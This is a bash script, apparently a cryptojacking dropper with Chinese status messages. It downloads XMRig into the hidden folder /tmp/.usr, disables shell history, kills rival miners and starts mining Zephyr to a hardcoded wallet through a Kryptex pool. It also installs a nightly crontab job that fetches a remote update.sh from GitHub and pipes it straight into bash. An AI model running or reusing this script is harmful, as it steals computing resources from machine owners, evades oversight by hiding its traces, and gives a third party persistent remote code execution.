#!/bin/bash


set +o history

HOST="zeph.kryptex.network"

ROOT_path="/tmp/.usr"
wallet="ZEPHYR3CsXhCWhVERSvRJeHV6NFbvQ6kiJMBdCY6uNAG6vajeopVuXBdKh1QPYvUh5K5i38stfwRjbbshxDaFBNSU16xiu1ifnt1o"
xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
random_number=$(shuf -i 10000000-99999999 -n 1)
command=""
existing_crontab=$(crontab -l 2>/dev/null)



if curl --output /dev/null --silent --head --fail "http://$HOST"; then
    echo "网络畅通 到 $HOST"
else
    echo "连接失败"
    exit 1
fi


if pgrep xmrig > /dev/null; then
    # 如果进程存在，则杀死它
    pkill xmrig
    echo "已杀死xmrig进程"
else
    echo "xmrig进程不存在"
fi


if [ ! -d "$ROOT_path" ]; then
    echo "文件夹不存在，正在创建..."
    mkdir -p "$ROOT_path"
    if [ $? -ne 0 ]; then
        echo "无法创建文件夹"
        exit 1
    fi
fi

cd "$ROOT_path" || handle_error "无法切换到目录: $ROOT_path"

wget --no-check-certificate -O "xmrig.tar.gz" "$xmrig_url"
tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
chmod +x "$ROOT_path/xmrig"
a='./xmrig --coin zephyr --url "zeph.kryptex.network:8888" --user "'
c='/'
d='" --tls -k -B '
com="$a$wallet$c$random_number$d"

start_sh="$ROOT_path/start.sh"
if [ -f "$start_sh" ]; then
    echo "启动文件存在: $start_sh"
    wall=$(cat start.sh 2>/dev/null)
    if grep -q "$wallet" "$start_sh"; then
        echo "字符串 '$wallet' 存在于文件 '$start_sh' 中"
        chmod +x start.sh
        ./start.sh
    else
        echo "字符串 '$wallet' 不存在于文件 '$start_sh' 中"
        echo "生成启动文件"
        echo $com > start.sh
        chmod +x start.sh
        ./start.sh
    fi
else
    echo "启动文件不存在: $start_sh"
    echo "生成启动文件"
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
fi



sleep 10


if pgrep xmrig > /dev/null; then
    echo "xmrig进程存在，退出Shell代码执行"
    
else
    echo "xmrig进程不存在"
    exit 0
fi

if echo "$existing_crontab" | grep -q "0 1 * * *  curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash"; then
    echo "指定的计划任务已添加"
else
    # 如果不存在，则添加计划任务
    (crontab -l 2>/dev/null; printf "0 1 * * *  curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash\n") | crontab -
    echo "已添加指定的计划任务"
fi

